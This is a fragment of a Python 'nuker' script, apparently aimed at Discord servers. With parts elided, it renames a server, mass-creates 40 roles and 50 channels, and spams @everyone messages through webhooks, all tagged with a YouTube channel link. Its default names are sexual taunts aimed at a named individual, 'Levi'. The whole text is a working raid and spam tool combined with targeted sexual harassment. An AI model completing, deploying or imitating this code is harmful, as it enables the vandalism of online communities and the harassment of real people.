...
if themessage == "":
    themessage = "@everyone\n**Spirit was here** <a:trolli:1130231841073414294>\n\nhttps://www.youtube.com/channel/UC2pP-4DKEtAQkSw3_DzxNRQ"
sname = input("Enter new server name [Enter for default]: ")
if sname == "":
    sname = "Spirit nuker cums on u just like levi"
num_channels = 50
num_messages = 41
num_roles = 40
...
async def create_roles(session):
    ...
    rname = "Tyson On Top Levi on bottom freaky lil boy"
...
async def create_channels_and_spam(session):
    ...
    create_channel_payload = {
        'name': 'levi cums in my mouth',
        'type': 0
    }
    create_webhook_url = f'https://discord.com/api/v9/channels/{{channel_id}}/webhooks'
    create_webhook_payload = {
        'name': 'why are you looking at the webhook name | https://www.youtube.com/channel/UC2pP-4DKEtAQkSw3_DzxNRQ',
    }
